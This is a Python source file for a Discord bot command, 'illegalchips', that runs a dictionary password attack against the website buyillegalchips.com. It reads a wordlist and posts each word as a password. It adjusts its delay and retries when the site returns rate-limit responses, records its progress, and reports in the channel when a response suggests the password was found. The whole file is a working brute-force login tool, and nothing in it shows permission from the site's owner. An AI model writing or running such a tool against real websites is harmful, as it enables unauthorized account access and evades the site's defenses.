from discord.ext import commands
import re
import requests
import time

tmp_dir = 'cogs/tmp/'
last_idx = 20000
x = 0.89

def saveFile(filename, content):
    # write file
    with open(f"{tmp_dir}{filename}.txt", 'w') as fp:
        fp.write(str(content))

def openFile(filename):
    # read file
    with open(f"{tmp_dir}{filename}.txt", 'r') as fp:
        return fp.read().strip()

class IllegalChips(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name='illegalchips', aliases=['ic'])
    async def illegal_chips(self, message_or_context):
        """Attempts various passwords for website."""

        if isinstance(message_or_context, commands.context.Context):
            message = message_or_context.message
        else:
            message = message_or_context

        # list to store file lines
        lines = []
        # read file
        with open(f"{tmp_dir}words_trimmed.txt", 'r') as fp:
            # read an store all lines into list
            lines = fp.readlines()
            
        x = 0.89

        last_idx = int(openFile("lastidx"))

        await message.channel.send(f"Starting on index number {last_idx}")

        i = 0

        for idx, line in enumerate(lines):
            if idx > last_idx:
                i += 1
                if i > 500:
                    await message.channel.send(f"Still testing... just finished trying '{pw}'. Now on row '{idx}'.")
                    i = 0
                time.sleep(x)
                pw = line.replace("\n", "").strip().lower()
                json_data = {"password": pw}
                res = requests.post("https://buyillegalchips.com/", json=json_data)
                last_idx = idx
                print(pw, res.status_code)
                if int(str(res.status_code)[0]) == 5:
                    print(f"SERVER DOWN AT ROW {last_idx}")
                else:
                    if int(str(res.status_code)[0]) != 4:
                        saveFile("found_password", pw)
                        saveFile("lastidx", last_idx)
                        await message.channel.send(f"I think I found it! '{pw}'")
                        break
                    if res.status_code == 429:
                        x = x + 0.01
                        time.sleep(10)

                        res = requests.post("https://buyillegalchips.com/", json=json_data)
                        if int(str(res.status_code)[0]) != 4:
                            saveFile("found_password", pw)
                            saveFile("lastidx", last_idx)
                            await message.channel.send(f"I think I found it! '{pw}'")
                            break
                        if res.status_code == 429:
                            time.sleep(10)

                            res = requests.post("https://buyillegalchips.com/", json=json_data)
                            if int(str(res.status_code)[0]) != 4:
                                saveFile("found_password", pw)
                                saveFile("lastidx", last_idx)
                                await message.channel.send(f"I think I found it! '{pw}'")
                                break
                            if res.status_code == 429:
                                time.sleep(10)


def setup(bot):
    bot.add_cog(IllegalChips(bot))
